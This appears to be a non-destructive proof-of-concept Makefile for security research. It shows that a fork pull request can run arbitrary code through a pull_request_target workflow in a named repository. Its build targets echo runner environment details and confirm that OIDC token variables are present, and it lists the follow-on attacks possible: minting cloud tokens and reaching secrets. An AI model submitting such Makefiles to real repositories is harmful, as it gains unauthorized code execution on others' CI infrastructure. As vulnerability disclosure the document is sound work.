# PoC Makefile -- Security Research (Non-Destructive)
# This demonstrates arbitrary code execution via pull_request_target
# No secrets are exfiltrated. No systems are modified.

.PHONY: all check format test venv

all: check format test

venv:
	@echo "=== PoC: venv target executed ==="

check: venv
	@echo "============================================"
	@echo "=== SECURITY PoC: ARBITRARY CODE EXECUTION ==="
	@echo "============================================"
	@echo ""
	@echo "--- Environment Information ---"
	@echo "GITHUB_WORKFLOW=$${GITHUB_WORKFLOW}"
	@echo "GITHUB_EVENT_NAME=$${GITHUB_EVENT_NAME}"
	@echo "GITHUB_ACTOR=$${GITHUB_ACTOR}"
	@echo "GITHUB_TRIGGERING_ACTOR=$${GITHUB_TRIGGERING_ACTOR}"
	@echo "GITHUB_REPOSITORY=$${GITHUB_REPOSITORY}"
	@echo "GITHUB_REF=$${GITHUB_REF}"
	@echo "GITHUB_SHA=$${GITHUB_SHA}"
	@echo "RUNNER_OS=$${RUNNER_OS}"
	@echo "RUNNER_NAME=$${RUNNER_NAME}"
	@echo "RUNNER_TEMP=$${RUNNER_TEMP}"
	@echo ""
	@echo "--- Proving Code Execution ---"
	@echo "Hostname: $$(hostname)"
	@echo "Whoami: $$(whoami)"
	@echo "PWD: $$(pwd)"
	@echo "Date: $$(date -u)"
	@echo "Kernel: $$(uname -a)"
	@echo ""
	@echo "--- Proving id-token:write Scope (NOT minting, just confirming) ---"
	@echo "ACTIONS_ID_TOKEN_REQUEST_URL is set: $$(if [ -n \"$${ACTIONS_ID_TOKEN_REQUEST_URL}\" ]; then echo YES; else echo NO; fi)"
	@echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN is set: $$(if [ -n \"$${ACTIONS_ID_TOKEN_REQUEST_TOKEN}\" ]; then echo YES; else echo NO; fi)"
	@echo ""
	@echo "--- PoC Summary ---"
	@echo "This Makefile was provided by a fork PR and executed"
	@echo "in the context of the base repository (microsoft/typeagent-py)."
	@echo "The permissions-check job is COMMENTED OUT, providing zero gating."
	@echo "An attacker could use this to:"
	@echo "  1. Execute arbitrary commands on GitHub-hosted runners"
	@echo "  2. Mint OIDC tokens (id-token: write) for cloud auth"
	@echo "  3. Access any secrets available to the workflow"
	@echo "============================================"
	@echo "=== END SECURITY PoC ==="
	@echo "============================================"

format: venv
	@echo "=== PoC: format target executed (code execution confirmed) ==="

test: venv
	@echo "=== PoC: test target executed (code execution confirmed) ==="
